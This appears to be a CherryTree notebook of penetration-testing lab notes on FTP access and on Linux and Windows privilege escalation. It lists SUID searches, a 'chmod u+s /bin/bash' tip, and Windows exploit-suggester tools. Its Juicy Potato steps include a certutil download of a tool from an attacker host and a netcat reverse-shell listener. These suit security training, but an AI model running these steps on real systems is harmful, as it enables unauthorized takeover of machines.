        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@10.10.10.58'</codebox>
        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 10.10.10.58</codebox>
      </node>
      <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1700426296">
        <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
          <rich_text>• use pspy64
• use linpeas
• check sudo -l
• check SUID with the following

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
PS: A binary can be changed to </rich_text>
          <rich_text family="monospace">SUID</rich_text>
          <rich_text> by using </rich_text>
          <rich_text family="monospace">chmod u+s /bin/bash</rich_text>
          <rich_text>

• check do as via:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>

References:
◇ </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</rich_text>
          <rich_text>
◇ </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</rich_text>
          <rich_text>

  </rich_text>
          <codebox char_offset="76" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -u=s -type f 2&gt;/dev/null
or 
find / -perm -4000 2&gt;/dev/null</codebox>
          <codebox char_offset="165" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -type f -name doas.conf 2&gt;/dev/null</codebox>
        </node>
        <node name="Windows" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700426296" ts_lastsave="1701642258">
          <rich_text>
Use winpeas-ng from here:

</rich_text>
          <rich_text link="webs https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</rich_text>
          <rich_text>

_____________________________________________________________________________


Use windows exploit suggester -next generation


1. If u install it wesng via pip make sure u have the updated db.zip in the local directory
2. run this command on windows </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   and copy the output to a file, lets say sysinfo.txt
3. then run the following command in the local folder where the database.zip file is
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
to view exploit only issues

4. Either get the exploit checking elevation of privelege and get the relevant kernel exploit (start with MS )from ExploitDB. Ex

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   

or
 you check the CVE here and view the relevant kernel exploit (u can search it)

</rich_text>
          <rich_text link="webs https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</rich_text>
          <rich_text>


______________________________________________________________________________

Sherlock
</rich_text>
          <rich_text link="webs https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</rich_text>
          <rich_text>   by

1. downloading the ps1 file to Target machine </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2. running
   a.</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   b. </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

should give u all the info
_________________________________________________________________________________

</rich_text>
          <rich_text scale="h2">Juicy potato 
</rich_text>
          <rich_text>
&#13;1. download juicy potato from here </rich_text>
          <rich_text link="webs https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</rich_text>
          <rich_text>
&#13;2. Transfer it to target via </rich_text>
          <rich_text family="monospace">certutil.exe -urlcache -f http://10.10.14.21/JuicyPotatoNG.exe jp.exe</rich_text>
          <rich_text>
&#13;3. Find ur CLSIDs from here </rich_text>
          <rich_text link="webs https://ohpe.it/juicy-potato/CLSID/">https://ohpe.it/juicy-potato/CLSID/</rich_text>
          <rich_text>
&#13;4. Start a listener </rich_text>
          <rich_text family="monospace">nc -vlp 4343</rich_text>
          <rich_text>
&#13;5. run the following to get a reverse shell:   
   `</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   Ex: `</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>`
   
   or
   
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
   

   where `1337` is not the reverse shell port but a port to tell juicy potato to run stuff on ur system. Actual reverse shell with port should eb in ur `privesc.exe` file
&#13;____________________________________
also try

</rich_text>
          <rich_text link="webs https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</rich_text>
          <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">systeminfo</codebox>
          <codebox char_offset="483" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wes sysinfo.txt --color -e</codebox>
          <encoded_png char_offset="644" justification="left" link="">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